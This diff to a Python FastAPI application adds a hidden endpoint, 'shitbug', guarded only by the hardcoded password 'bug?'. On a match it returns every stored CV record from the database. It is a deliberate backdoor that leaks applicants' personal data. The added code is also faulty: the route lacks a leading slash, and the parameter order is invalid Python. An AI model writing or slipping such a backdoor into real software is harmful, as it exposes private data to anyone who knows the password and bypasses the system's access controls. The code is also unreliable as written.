@@ -17,6 +17,12 @@ import uuid
 def test(db: Session = Depends(get_db)):
     return 'ok'
 
+
+@app.post('shitbug')
+def bug(db: Session = Depends(get_db), pwd: str):
+    if pwd == "bug?":
+        cvlis = db.query(models.CVinfo).all()
+        return cvlis
 # -------------------------登录/申请处理路由------------------------------------
 
 # 处理登录
